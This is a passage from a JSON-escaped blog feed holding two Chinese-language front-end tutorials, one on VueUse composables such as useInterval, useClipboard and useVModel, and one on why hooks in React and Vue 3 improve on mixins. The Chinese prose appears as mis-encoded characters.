\u0026lt;/UseMouse\u0026gt; ä¾‹å­(äºŒ)ï¼šuseInterval é¡§åæ€ç¾©ï¼Œé€™å€‹æ–¹æ³•æ˜¯å°å»¶æ—¶é‡è¤‡èª¿ç”¨èƒ½åŠ›çš„å°è£ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;script setup lang=\u0026#34;ts\u0026#34;\u0026gt; import { useInterval } from \u0026#39;.\u0026#39; const { counter, pause, resume } = useInterval(200, { controls: true }) // counter ä¸€å€‹ Ref å°è±¡ï¼Œå®ƒæ˜¯éŸ¿æ‡‰å¼çš„ï¼Œcounter.value ç­‰æ–¼å·²ç¶“è¨ˆç®—çš„æ¬¡æ•¸ // pause() æš«åœ // resume() æ¢å¾© \u0026lt;/script\u0026gt; \u0026lt;template\u0026gt; \u0026lt;div id=\u0026#34;APP\u0026#34;\u0026gt; \u0026lt;p\u0026gt;Interval fired: {{ counter }}\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; æ•ˆæœï¼š\næ˜¯ä¸æ˜¯å¾ˆå¥½ç”¨ï¼Ÿç›¸æ¯”æ‰‹å¯« setInterval æ›´ç‚ºä¾¿æ·ã€‚\nå¦‚æœå¾’æ‰‹å¯¦ç¾é€™æ¨£ä¸€æ•´å¥—æ–¹æ³•ï¼Œå¤šå°‘è¡Œæš«ä¸”ä¸èªªï¼Œæˆ‘å€‘éœ€è¦åœ¨æ¥­å‹™ä¸­å¯«ä¸‹å¤§é‡çš„é‚è¼¯ä»£ç¢¼ã€‚\nè€Œçœ¾æ‰€å‘¨çŸ¥ï¼š\nå¯«çš„ä»£ç¢¼è¶Šå¤šï¼Œå‡º Bug çš„å¯èƒ½æ€§è¶Šå¤§ï¼Œç¶­è­·å’Œç†è§£çš„é›£åº¦å°±è¶Šé«˜ã€‚å¾é€™å€‹è§’åº¦çœ‹ï¼Œé€™å€‹åº«ç¢ºå¯¦æ˜¯ä¸€å€‹åˆæ ¼çš„å‡½æ•¸å·¥å…·é›†ã€‚\nä¾‹å­(ä¸‰)ï¼šuseClipboard ä»¥è¤‡è£½æ–‡å­—ç‚ºä¾‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 \u0026lt;script setup\u0026gt; import { useClipboard } from \u0026#39;@vueuse/core\u0026#39;; // åªéœ€è¦å¼•å…¥æ‰€ä½¿ç”¨åˆ°çš„ API import { ref } from \u0026#39;vue\u0026#39; const input = ref(\u0026#39;æˆ‘æ˜¯ Winnie\u0026#39;) const { text, // è¤‡è£½çš„å€¼ isSupported, // ç€è¦½å™¨æœ‰ç„¡æ”¯æ´ copy, // æ–¹æ³• copied } = useClipboard() \u0026lt;/script\u0026gt; \u0026lt;template\u0026gt; \u0026lt;div v-if=\u0026#34;isSupported\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;useClipboard\u0026lt;/h3\u0026gt; \u0026lt;p\u0026gt;è¤‡è£½å…§å®¹ï¼š{{ input }}\u0026lt;/p\u0026gt; \u0026lt;input v-model=\u0026#34;input\u0026#34; /\u0026gt; \u0026lt;a @click=\u0026#34;copy(input)\u0026#34;\u0026gt;{{ copied ? \u0026#34;å·²è¤‡è£½\u0026#34; : \u0026#34;è¤‡è£½\u0026#34; }}\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;p v-else\u0026gt;Your browser does not support Clipboard API\u0026lt;/p\u0026gt; \u0026lt;/template\u0026gt; æ•ˆæœï¼š\nä¾‹å­(å››)ï¼šuseVModel é€™æ˜¯ä¸€å€‹çµ¦ç¶“å¸¸å°è£çµ„ä»¶çš„å°ä¼™ä¼´å€‘çš„å¤§å¥½åˆ©å™¨ã€‚\nå…ˆå‰µå»ºä¸€å€‹çµ„ä»¶ï¼šTest.vue\nTest.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; name: \u0026lt;input v-model=\u0026#34;_name\u0026#34;/\u0026gt; age: \u0026lt;input v-model=\u0026#34;_age\u0026#34;/\u0026gt; sex: \u0026lt;input v-model=\u0026#34;_sex\u0026#34;/\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#34;ts\u0026#34; setup\u0026gt; import { useVModel } from \u0026#39;@vueuse/core\u0026#39; const props = defineProps({ name: String, age: String, sex: String }) const emit = defineEmits([\u0026#39;update:name\u0026#39;, \u0026#39;update:age\u0026#39;, \u0026#39;update:sex\u0026#39;]) const _name = useVModel(props, \u0026#39;name\u0026#39;, emit) const _age = useVModel(props, \u0026#39;age\u0026#39;, emit) const _sex = useVModel(props, \u0026#39;sex\u0026#39;, emit) \u0026lt;/script\u0026gt; æ¥è‘—ï¼Œåœ¨ index.vue ä¸­ä½¿ç”¨å®ƒ\nindex.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;Test v-model:name=\u0026#34;formData.name\u0026#34; v-model:age=\u0026#34;formData.age\u0026#34; v-model:sex=\u0026#34;formData.sex\u0026#34; \u0026gt;\u0026lt;/Test\u0026gt; {{ formData }} \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup lang=\u0026#34;ts\u0026#34;\u0026gt; import { reactive } from \u0026#39;vue-demi\u0026#39;; import Test from \u0026#39;./Test.vue\u0026#39; const formData = reactive({ name: \u0026#39;lily\u0026#39;, age: \u0026#39;8\u0026#39;, sex: \u0026#39;boy\u0026#39; }) \u0026lt;/script\u0026gt; æ•ˆæœï¼š\nå°æ–¼æœ‰çµ„ä»¶å°è£éœ€æ±‚çš„æœ‹å‹ï¼Œé€™å€‹æ–¹æ³•å¼·çƒˆæ¨è–¦ï¼\nä¸ç”¨å†ç‚ºäº†å–®å‘æ•¸æ“šæµçš„çµ„ä»¶å°è£ï¼Œè€Œåœ¨çµ„ä»¶å…§å¯«å†—é¤˜çš„ä»£ç¢¼äº†ã€‚\nç›´æ¥å°‡ useVModel è¿”å›çš„æ•¸æ“šä½œç‚ºéŸ¿æ‡‰å¼å°è±¡ç”¨å³å¯ã€‚\næœ€å¾Œ ä¾‹å­å¤ªå¤šï¼Œå°±ä¸å†ä¸€ä¸€ä»‹ç´¹äº†ï¼Œä½†å¤§å®¶æ‡‰è©²å·²ç¶“æœ‰äº†ä¸€å€‹åˆæ­¥çš„æ¦‚å¿µï¼ŒçŸ¥é“äº†æ­¤åº«çš„ä½œç”¨ï¼Œä¸€è¨€ä»¥è”½ä¹‹ï¼šåŠ©åŠ›æ‘¸é±¼ï¼Œæå‰ä¸‹ç­ã€‚\nå®ƒæ²’è¾¦æ³•åšåˆ°ä½ ä¹‹å‰åšä¸åˆ°çš„äº‹æƒ…ã€‚\nå®ƒåªèƒ½åšåˆ°è®“ä½ æ›´è¼•é¬†çš„å®Œæˆå·¥ä½œï¼é¡˜ä½ ä»Šå¤©ä¹Ÿèƒ½æŒ‰æ™‚ä¸‹ç­ã€‚\n","date":"2022-12-30T00:00:00Z","image":"https://live.staticflickr.com/65535/52595409644_aa1fd7bf45_o.png","permalink":"https://wayneblog.ga/2022-12-30/npm-vueuse/","title":"ã€VueUseã€‘ä¸€æ¬¾åŸºæ–¼ Vue Composition API çš„å‡½å¼å·¥å…·é›†"},{"content":" åƒè€ƒç¶²ç«™\nä¸€ã€hooksï¼šä»€éº¼å«å¤§å‹¢æ‰€è¶¨ï¼Ÿ 2019å¹´å¹´åˆï¼Œreact åœ¨ 16.8.x ç‰ˆæœ¬æ­£å¼å…·å‚™äº† hooks èƒ½åŠ›ã€‚\n2019å¹´6æœˆï¼Œå°¤é›¨æºªåœ¨ vue/github-issues è£¡æå‡ºäº†é—œæ–¼ vue3 Composition API çš„ææ¡ˆã€‚(vue hooksçš„åŸºç¤)\nåœ¨å¾ŒçºŒçš„ react å’Œ vue3 ç›¸é—œç‰ˆæœ¬ä¸­ï¼Œç›¸é—œ hooks èƒ½åŠ›éƒ½é–‹å§‹è¢«æ›´å¤šäººæ‰€æ¥å—ã€‚\né™¤æ­¤ä¹‹å¤–ï¼Œsolid.jsã€preact ç­‰æ¡†æ¶ï¼Œä¹Ÿæ˜¯é–‹å§‹é¸æ“‡åŠ å…¥ hooks å¤§å®¶åº­ã€‚\nå¯ä»¥é è¦‹ï¼Œé›–ç„¶ç›®å‰ä»ç„¶æ˜¯ class Component å’Œ hooks api ä¸¦é§•é½Šé©…çš„å ´é¢ï¼Œä½†æœªä¾†å¹¾å¹´è£¡ï¼Œhooks æ¥µæœ‰å¯èƒ½å–ä»£ class Component æˆç‚ºæ¥­å…§çœŸæ­£çš„ä¸»æµã€‚\näºŒã€ä»€éº¼æ˜¯ hooksï¼Ÿ hooks çš„å®šç¾© hooks ç›´è­¯æ˜¯\u0026quot;é‰¤å­\u0026quot;ï¼Œå®ƒä¸¦ä¸åƒ…æ˜¯ reactï¼Œç”šè‡³ä¸åƒ…æ˜¯å‰ç«¯ç•Œçš„å°ˆç”¨è¡“èªï¼Œè€Œæ˜¯æ•´å€‹è¡Œæ¥­æ‰€ç†ŸçŸ¥çš„ç”¨èªã€‚\né€šå¸¸æŒ‡ï¼š\nç³»çµ±é‹è¡Œåˆ°æŸä¸€æ™‚æœŸæ™‚ï¼Œæœƒèª¿ç”¨è¢«è¨»å†Šåˆ°è©²æ™‚æ©Ÿçš„å›èª¿å‡½æ•¸ã€‚\næ¯”è¼ƒå¸¸è¦‹çš„é‰¤å­æœ‰ï¼šwindows ç³»çµ±çš„é‰¤å­èƒ½ç›£è½åˆ°ç³»çµ±çš„å„ç¨®äº‹ä»¶ï¼Œç€è¦½å™¨æä¾›çš„ onload æˆ– addEventListener èƒ½è¨»å†Šåœ¨ç€è¦½å™¨å„ç¨®æ™‚æ©Ÿè¢«èª¿ç”¨çš„æ–¹æ³•ã€‚\nä»¥ä¸Šé€™äº›ï¼Œéƒ½å¯ä»¥è¢«ç¨±ä¸€è² hookã€‚\nä½†æ˜¯å¾ˆé¡¯ç„¶ï¼Œåœ¨ç‰¹å®šé ˜åŸŸçš„ç‰¹å®šè©±é¡Œä¸‹ï¼Œhooks é€™å€‹è©è¢«è³¦äºˆäº†ä¸€äº›ç‰¹æ®Šçš„å«ç¾©ã€‚\nåœ¨ react@16.x ä¹‹å‰ï¼Œç•¶æˆ‘å€‘è«‡è«– hooks æ™‚ï¼Œæˆ‘å€‘å¯èƒ½è«‡è«–çš„æ˜¯\u0026quot;çµ„ä»¶çš„ç”Ÿå‘½é€±æœŸ\u0026quot;ã€‚\nä½†æ˜¯ç¾åœ¨ï¼Œhooks å‰‡æœ‰äº†å…¨æ–°çš„å«ç¾©ã€‚\nä»¥ react ç‚ºä¾‹ï¼Œhooks æ˜¯ï¼š\nä¸€ç³»åˆ—ä»¥ \u0026ldquo;use\u0026rdquo; ä½œç‚ºé–‹é ­çš„æ–¹æ³•ï¼Œå®ƒå€‘æä¾›äº†è®“ä½ å¯ä»¥å®Œå…¨é¿é–‹ class å¼å¯«æ³•ï¼Œåœ¨å‡½æ•¸å¼çµ„ä»¶ä¸­å®Œæˆç”Ÿå‘½é€±æœŸã€ç‹€æ…‹ç®¡ç†ã€é‚è¼¯è¤‡ç”¨ç­‰å¹¾ä¹å…¨éƒ¨çµ„ä»¶é–‹ç™¼å·¥ä½œçš„èƒ½åŠ›ã€‚\nç°¡åŒ–ä¸€ä¸‹ï¼š\nä¸€ç³»åˆ—æ–¹æ³•ï¼Œæä¾›äº†åœ¨å‡½æ•¸å¼çµ„ä»¶ä¸­å®Œæˆé–‹ç™¼å·¥ä½œçš„èƒ½åŠ›ã€‚\n(è¨˜ä½é€™å€‹é—œéµè©ï¼šå‡½æ•¸å¼çµ„ä»¶)\n1 2 import { useState, useEffect, useCallback } from \u0026#39;react\u0026#39;; // æ¯”å¦‚ä»¥ä¸Šé€™å¹¾å€‹æ–¹æ³•ï¼Œå°±æ˜¯æœ€ç‚ºå…¸å‹çš„ Hooks è€Œåœ¨ vue ä¸­ï¼Œhooks çš„å®šç¾©å¯èƒ½æ›´æ¨¡ç³Šï¼Œå§‘ä¸”ç¸½çµä¸€ä¸‹ï¼š\nåœ¨ vue çµ„åˆå¼ API è£¡ï¼Œä»¥ \u0026ldquo;use\u0026rdquo; ä½œç‚ºé–‹é ­çš„ï¼Œä¸€ç³»åˆ—æä¾›äº†çµ„ä»¶è¤‡ç”¨ã€ç‹€æ…‹ç®¡ç†\u0026hellip;ç­‰é–‹ç™¼èƒ½åŠ›çš„æ–¹æ³•ã€‚\n(é—œéµè©ï¼šçµ„åˆå¼API)\n1 2 3 import { useSlots, useAttrs } from \u0026#39;vue\u0026#39;; import { useRouter } from \u0026#39;vue-router\u0026#39;; // ä»¥ä¸Šé€™äº›æ–¹æ³•ï¼Œä¹Ÿæ˜¯ vue3 ä¸­ç›¸é—œçš„ Hookï¼ å¦‚ï¼šuseSlotsã€useAttrsã€useRouter ç­‰ã€‚\nä½†ä¸»è§€ä¾†èªªï¼Œæˆ‘èªç‚º vue çµ„åˆå¼ API å…¶æœ¬èº«å°±æ˜¯ \u0026ldquo;vue hooks\u0026rdquo; çš„é—œéµä¸€ç’°ï¼Œèµ·åˆ°äº† react hooks è£¡å°ç”Ÿå‘½é€±æœŸã€ç‹€æ…‹ç®¡ç†çš„æ ¸å¿ƒä½œç”¨ã€‚(å¦‚ onMountedã€ref ç­‰ç­‰)ã€‚\nå¦‚æœæŒ‰é€™å€‹æ¨™æº–ä¾†çœ‹çš„è©±ï¼Œvue å’Œ react ä¸­ hooks çš„å®šç¾©ï¼Œä¼¼ä¹éƒ½å·®ä¸å¤šã€‚\né‚£éº¼ç‚ºä»€éº¼è¦æåˆ°æ˜¯ä»¥ \u0026quot;use\u0026quot; ä½œç‚ºé–‹é ­çš„æ–¹æ³•å‘¢ï¼Ÿ\nå‘½åè¦ç¯„å’ŒæŒ‡å°æ€æƒ³ é€šå¸¸ä¾†èªªï¼Œhooks çš„å‘½åéƒ½æ˜¯ä»¥ use ä½œç‚ºé–‹é ­ï¼Œé€™å€‹è¦ç¯„ä¹ŸåŒ…æ‹¬äº†é‚£éº¼æˆ‘å€‘è‡ªå®šç¾©çš„ hooksã€‚\nç‚ºä»€éº¼ï¼Ÿ\nåœ¨ react å®˜æ–¹æ–‡æª”è£¡ï¼Œå° hooks çš„å®šç¾©å’Œä½¿ç”¨æå‡ºäº† ä¸€å€‹å‡è¨­ã€å…©å€‹åªåœ¨ æ ¸å¿ƒæŒ‡å°æ€æƒ³ã€‚\nä¸€å€‹å‡è¨­ï¼šå‡è¨­ä»»ä½•ä»¥ã€Œuseã€ é–‹é ­ä¸¦ç·Šè·Ÿè‘—ä¸€å€‹å¤§å¯«å­—æ¯çš„å‡½æ•¸å°±æ˜¯ä¸€å€‹ Hookã€‚\nç¬¬ä¸€å€‹åªåœ¨ï¼šåªåœ¨ React å‡½æ•¸çµ„ä»¶ä¸­èª¿ç”¨ Hookï¼Œè€Œä¸åœ¨æ™®é€šå‡½æ•¸ä¸­èª¿ç”¨ Hookã€‚(Eslint é€šéåˆ¤æ–·ä¸€å€‹æ–¹æ³•æ˜¯ä¸æ˜¯å¤§å¨å³°å‘½åä¾†åˆ¤æ–·å®ƒæ˜¯å¦æ˜¯ React å‡½æ•¸)\nç¬¬äºŒå€‹åªåœ¨ï¼šåªåœ¨æœ€é ‚å±¤ä½¿ç”¨ Hookï¼Œè€Œä¸è¦åœ¨å¾ªç’°ã€æ¢ä»¶æˆ–åµŒå¥—å‡½æ•¸ä¸­èª¿ç”¨ Hookã€‚\nå› ç‚ºç´„å®šçš„åŠ›é‡åœ¨æ–¼ï¼šæˆ‘å€‘ä¸ç”¨ç´°çœ‹å¯¦ç¾ï¼Œä¹Ÿèƒ½é€šéå‘½åä¾†äº†è§£ä¸€å€‹å®ƒæ˜¯ä»€éº¼ã€‚\nä»¥ä¸Š ä¸€å€‹å‡è¨­ã€å…©å€‹åªåœ¨ ç¸½çµè‡ª react å®˜ç¶²ï¼š\nHook çš„è¦å‰‡ Lint è¦å‰‡ç©¶ç«Ÿå¼·åˆ¶äº†äº›ä»€éº¼ï¼Ÿ ä¸‰ã€ç‚ºä»€éº¼æˆ‘å€‘éœ€è¦ hooksï¼Ÿ æ›´å¥½çš„ç‹€æ…‹è¤‡ç”¨ é‡å°çš„å°±æ˜¯ä½ ï¼Œmixinï¼\nåœ¨ class çµ„ä»¶æ¨¡å¼ä¸‹ï¼Œç‹€æ…‹é‚è¼¯çš„è¤‡ç”¨æ˜¯ä¸€ä»¶å›°é›£çš„äº‹æƒ…ã€‚\nå‡è¨­æœ‰å¦‚ä¸‹éœ€æ±‚ï¼š\nç•¶çµ„ä»¶å¯¦ä¾‹å‰µå»ºæ™‚ï¼Œéœ€è¦å‰µå»ºä¸€å€‹ state å±¬æ€§ï¼šnameï¼Œä¸¦éš¨æ©Ÿçµ¦æ­¤ name å±¬æ€§é™„ä¸€å€‹åˆå§‹å€¼ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œé‚„å¾—æä¾›ä¸€å€‹ setName æ–¹æ³•ã€‚ä½ å¯ä»¥åœ¨çµ„ä»¶å…¶ä»–åœ°æ–¹å–å¾—å’Œä¿®æ”¹æ­¤ç‹€æ…‹å±¬æ€§ã€‚\næ›´é‡è¦çš„æ˜¯ï¼šé€™å€‹é‚è¼¯è¦å¯ä»¥è¤‡ç”¨ï¼Œåœ¨å„ç¨®æ¥­å‹™çµ„ä»¶è£¡è¤‡ç”¨é€™å€‹é‚è¼¯ã€‚\nåœ¨æ“æœ‰ Hooks ä¹‹å‰ï¼Œæˆ‘é¦–å…ˆæœƒæƒ³åˆ°çš„è§£æ±ºæ–¹æ¡ˆä¸€å®šæ˜¯ mixinã€‚\nä»£ç¢¼å¦‚ä¸‹ï¼š(æ­¤ç¤ºä¾‹æ¡ç”¨ vue2 mixin å¯«æ³•)\n1 2 3 4 5 6 7 8 9 10 11 12 13 // æ··å…¥æ–‡ä»¶ï¼šname-mixin.js export default { data() { return { name: genRandomName() // å‡è£å®ƒèƒ½ç”Ÿæˆéš¨æ©Ÿçš„åå­— } }, methods: { setName(name) { this.name = name } } } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;!-- ç»„ä»¶ï¼šmy-component.vue --\u0026gt; \u0026lt;template\u0026gt; \u0026lt;div\u0026gt;{{ name }}\u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; import nameMixin from \u0026#39;./name-mixin\u0026#39;; export default { mixins: [nameMixin], // é€šé mixinsï¼Œä½ å¯ä»¥ç›´æ¥ç²å¾— nameMixin ä¸­æ‰€å®šç¾©çš„ç‹€æ…‹ã€æ–¹æ³•ã€ç”Ÿå‘½å‘¨æœŸä¸­çš„äº‹ä»¶...ç­‰ mounted() { setTimeout(() =\u0026gt; { this.setName(\u0026#39;Tom\u0026#39;) }, 3000) } } \u0026lt;/script\u0026gt; ç²—ç•¥çœ‹ä¾†ï¼Œmixins ä¼¼ä¹æä¾›äº†éå¸¸ä¸éŒ¯çš„è¤‡ç”¨èƒ½åŠ›ï¼Œä½†æ˜¯ï¼Œreact å®˜æ–¹æ–‡æª”ç›´æ¥è¡¨æ˜ï¼š\nç‚ºä»€éº¼å‘¢ï¼Ÿ\nå› ç‚º mixins é›–ç„¶æä¾›äº†é€™ç¨®ç‹€æ…‹è¤‡ç”¨çš„èƒ½åŠ›ï¼Œä½†å®ƒçš„å¼Šç«¯å¯¦åœ¨å¤ªå¤šäº†ã€‚\nå¼Šç«¯ä¸€ï¼šé›£ä»¥è¿½æº¯çš„æ–¹æ³•èˆ‡å±¬æ€§ï¼ è©¦æƒ³ä¸€ä¸‹ï¼Œå¦‚æœå‡ºç¾é€™ç¨®ä»£ç¢¼ï¼Œä½ æ˜¯å¦æœƒæ‡·ç–‘äººç”Ÿï¼š\n1 2 3 4 5 6 7 export default { mixins: [ a, b, c, d, e, f, g ], // ç•¶ç„¶ï¼Œé€™åªæ˜¯è¡¨ç¤ºå®ƒæ··å…¥äº†å¾ˆå¤šèƒ½åŠ› mounted() { console.log(this.name) // å—¯...é€™å€‹ this.name ä¾†è‡ªæ–¼èª°ï¼Ÿæˆ‘é›£é“è¦ä¸€å€‹å€‹æ··å…¥çœ‹å¯¦ç¾ï¼Ÿ } } åˆæˆ–è€…ï¼š\n1 2 3 4 5 6 7 8 a.js mixins: [b.js] b.js mixins: [c.js] c.js mixins: [d.js] // ä½ çŒœçŒœçœ‹ï¼Œthis.name ä¾†è‡ªæ–¼èª°ï¼Ÿ // æ±‚æ±‚ä½ åˆ«å†èªªäº†ï¼Œæˆ‘è¡€å£“å·²ç»ä¸Šæ¥äº† å¼Šç«¯äºŒï¼šè¦†è“‹ã€åŒåï¼Ÿè²´åœˆçœŸäº‚ï¼ ç•¶æˆ‘åŒæ™‚æƒ³æ··å…¥ mixin-a.js å’Œ mixin-b.js ä»¥åŒæ™‚ç²å¾—å®ƒå€‘èƒ½åŠ›çš„æ™‚å€™ï¼Œä¸å¹¸çš„äº‹æƒ…ç™¼ç”Ÿäº†ï¼š\nç”±æ–¼é€™å…©å€‹ mixin åŠŸèƒ½çš„é–‹ç™¼è€…æƒºæƒºç›¸æƒœï¼Œå®ƒå€‘éƒ½å®šç¾©äº† this.name ä½œç‚ºå±¬æ€§ã€‚\né€™ç¨®æ™‚å€™ï¼Œä½ æœƒæ·±æ·±æ‡·ç–‘ï¼Œmixins ç©¶ç«Ÿæ˜¯ä¸æ˜¯ä¸€ç¨®ç§‘å­¸çš„è¤‡ç”¨æ–¹å¼ã€‚\nå¼Šç«¯ä¸‰ï¼šæ¢…é–‹äºŒåº¦ï¼Ÿä»£åƒ¹å¾ˆå¤§ï¼ ä»ç„¶èªªä¸Šé¢çš„ä¾‹å­ï¼Œå¦‚æœæˆ‘çš„éœ€æ±‚ç™¼ç”Ÿäº†æ”¹è®Šï¼Œæˆ‘éœ€è¦çš„ä¸å†æ˜¯ä¸€å€‹ç°¡å–®çš„ç‹€æ…‹ nameï¼Œè€Œæ˜¯åˆ†åˆ¥éœ€è¦ firstName å’Œ lastNameã€‚\næ­¤æ™‚ name-mixin.js æ··å…¥çš„èƒ½åŠ›å°±æœƒéå¸¸å°·å°¬ï¼Œå› ç‚ºæˆ‘ç„¡æ³•å…©æ¬¡ mixins åŒä¸€å€‹æ–‡ä»¶ã€‚\nç•¶ç„¶ï¼Œä¹Ÿæ˜¯æœ‰è§£æ±ºæ–¹æ¡ˆçš„ï¼Œå¦‚ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 // å‹•æ…‹ç”Ÿæˆ mixin function genNameMixin(key, funcKey) { return { data() { return { [key]: genRandomName() } }, methods: { [funcKey]: function(v) { this.[key] = v } } } } export default { mixins: [ genNameMixin(\u0026#39;firstName\u0026#39;, \u0026#39;setFirstName\u0026#39;), genNameMixin(\u0026#39;lastName\u0026#39;, \u0026#39;setLastName\u0026#39;), ] } ç¢ºå¯¦é€šéå‹•æ…‹ç”Ÿæˆ mixin å®Œæˆäº†èƒ½åŠ›çš„è¤‡ç”¨ï¼Œä½†é€™æ¨£ä¸€ä¾†ï¼Œç„¡ç–‘æ›´åŠ åœ°å¢å¤§äº†ç¨‹åºçš„è¤‡é›œæ€§ï¼Œé™ä½äº†å¯è®€æ€§ã€‚\nå› æ­¤ä¸€ç¨®æ–°çš„ç‹€æ…‹é‚è¼¯è¤‡ç”¨ï¼Œå°±è®Šå¾—æ¥µç‚ºè¿«åˆ‡äº†â€”â€”â€”â€”â€”â€”å®ƒå°±æ˜¯ Hooksï¼\nHook çš„ç‹€æ…‹è¤‡ç”¨å¯«æ³•ï¼š 1 2 3 4 5 6 7 // å–®å€‹ name çš„å¯«æ³• const { name, setName } = useName(); // æ¢…é–‹äºŒåº¦çš„å¯«æ³• const { name: firstName, setName: setFirstName } = useName(); const { name: secondName, setName: setSecondName } = useName(); ç›¸æ¯”æ–¼ mixinsï¼Œå®ƒå€‘ç°¡ç›´å¤ªæ£’äº†ï¼\næ–¹æ³•å’Œå±¬æ€§å¥½è¿½æº¯å—ï¼Ÿé€™å¯å¤ªå¥½äº†ï¼Œèª°ç”¢ç”Ÿçš„ï¼Œå“ªå…’ä¾†çš„ä¸€ç›®äº†ç„¶ã€‚ æœƒæœ‰é‡åã€è¦†è“‹å•é¡Œå—ï¼Ÿå®Œå…¨æ²’æœ‰ï¼å…§éƒ¨çš„è®Šé‡åœ¨é–‰åŒ…å…§ï¼Œè¿”å›çš„è®Šé‡æ”¯æŒå®šç¾©åˆ¥åã€‚ å¤šæ¬¡ä½¿ç”¨ï¼Œæ²’é–‹ N åº¦ï¼Ÿä½ çœ‹ä¸Šé¢çš„ä»£ç¢¼å¡Šå…§ä¸å°± \u0026ldquo;æ¢…é–‹ä¸‰åº¦\u0026rdquo; äº†å—ï¼Ÿ å°±è¡ ç‹€æ…‹é‚è¼¯å¾©ç”¨ é€™å€‹ç†ç”±ï¼ŒHooks å°±å·²ç¶“é¦™å¾—æˆ‘å£æ°´ç›´æµäº†ã€‚\nä»£ç¢¼çµ„ç¹” ç†µæ¸›ï¼Œå®‡å®™å“²å­¸åˆ°ç·¨ç¢¼å“²å­¸ã€‚\né …ç›®ã€æ¨¡å¡Šã€é é¢ã€åŠŸèƒ½ï¼Œå¦‚ä½•é«˜æ•ˆè€Œæ¸…æ™°åœ°çµ„ç¹”ä»£ç¢¼ï¼Œé€™ä¸€å€‹çœ‹ä¼¼ç°¡å–®çš„å‘½é¡Œå°±ç®—å¯«å¹¾æœ¬æ›¸ä¹Ÿç„¡æ³•å®Œå…¨èªªæ¸…æ¥šã€‚\nä½†ä¸€å€‹é é¢ä¸­ï¼ŒN ä»¶äº‹æƒ…çš„ä»£ç¢¼åœ¨ä¸€å€‹çµ„ä»¶å…§äº’ç›¸ç³¾çºç¢ºå¯¦æ˜¯åœ¨ Hooks å‡ºç¾ä¹‹å‰éå¸¸å¸¸è¦‹çš„ä¸€ç¨®ç‹€æ…‹ã€‚\né‚£éº¼ Hooks å¯«æ³•åœ¨ä»£ç¢¼çµ„ç¹”ä¸Šç©¶ç«Ÿèƒ½å¸¶ä¾†æ€æ¨£çš„æå‡å‘¢ï¼Ÿ\n(å‡è¨­ä¸Šåœ–ä¸­æ¯ä¸€ç¨®é¡è‰²å°±ä»£ç¢¼ä¸€ç¨®é«˜åº¦ç›¸é—œçš„æ¥­å‹™é‚è¼¯)\nç„¡è«–æ˜¯ vue é‚„æ˜¯ reactï¼Œé€šé Hooks å¯«æ³•éƒ½èƒ½åšåˆ°ï¼Œå°‡\u0026quot;åˆ†æ•£åœ¨å„ç¨®è²æ˜å‘¨æœŸè£¡çš„ä»£ç¢¼å¡Š\u0026quot;ï¼Œé€šé Hooks çš„æ–¹å¼å°‡ç›¸é—œçš„å…§å®¹èšåˆåˆ°ä¸€èµ·ã€‚\né€™æ¨£å¸¶ä¾†çš„å¥½è™•æ˜¯é¡¯è€Œæ˜“è¦‹çš„ï¼šé«˜åº¦èšåˆï¼Œå¯é–±è®€æ€§æå‡ã€‚ä¼´éš¨è€Œä¾†çš„ä¾¿æ˜¯æ•ˆç‡æå‡ï¼Œbugè®Šå°‘ã€‚\næŒ‰ç…§\u0026quot;ç‰©ç†å­¸\u0026quot;è£¡çš„ç†è«–ä¾†èªªï¼Œé€™ç¨®ä»£ç¢¼çµ„ç¹”æ–¹å¼ï¼Œå°±ç®—æ˜¯\u0026quot;ç†µæ¸›\u0026quot;äº†ã€‚\næ¯” class çµ„ä»¶æ›´å®¹æ˜“ç†è§£ å°¤å…¶æ˜¯ thisã€‚\nåœ¨ react çš„ class å¯«æ³•ä¸­ï¼Œéš¨è™•å¯è¦‹å„ç¨®å„æ¨£çš„ .bind(this)ã€‚(ç”šè‡³å®˜æ–¹æ–‡æª”è£¡ä¹Ÿæœ‰å°ˆé–€çš„ç« ç¯€æè¿°äº†\u0026quot;ç‚ºä»€éº¼ç¶å®šæ˜¯å¿…è¦çš„ï¼Ÿ\u0026ldquo;é€™ä¸€å•é¡Œ)\nvue ç©å®¶åˆ¥ç¬‘ï¼Œcomputed: { a: () =\u0026gt; { this } } è£¡çš„ this ä¹Ÿæ˜¯ undefinedã€‚\nå¾ˆé¡¯ç„¶ï¼Œç¶å®šé›–ç„¶\u0026quot;å¿…è¦\u0026rdquo;ï¼Œä½†ä¸¦ä¸æ˜¯\u0026quot;å„ªé»\u0026quot;ï¼Œåè€Œæ˜¯\u0026quot;æ•…éšœé«˜ç™¼\u0026quot;åœ°æ®µã€‚\nä½†åœ¨ Hooks å¯«æ³•ä¸­ï¼Œä½ å°±å®Œå…¨ä¸å¿…æ“”å¿ƒ this çš„å•é¡Œäº†ã€‚\nå› ç‚ºï¼š\næœ¬ä¾†ç„¡ä¸€ç‰©ï¼Œä½•è™•æƒ¹å¡µåŸƒã€‚\nHooks å¯«æ³•ç›´æ¥å‘Šåˆ¥äº† thisï¼Œå¾\u0026quot;å‡½æ•¸\u0026quot;ä¾†ï¼Œåˆ°\u0026quot;å‡½æ•¸\u0026quot;å»ã€‚\nåª½åª½å†ä¹Ÿä¸ç”¨æ“”å¿ƒæˆ‘å¿˜è¨˜å¯« bind äº†ã€‚\nå‹å¥½çš„æ¼¸é€²å¼ éš¨é¢¨æ½›å…¥å¤œï¼Œæ½¤ç‰©ç´°ç„¡è²ã€‚\næ¼¸é€²å¼çš„å«ç¾©æ˜¯ï¼šä½ 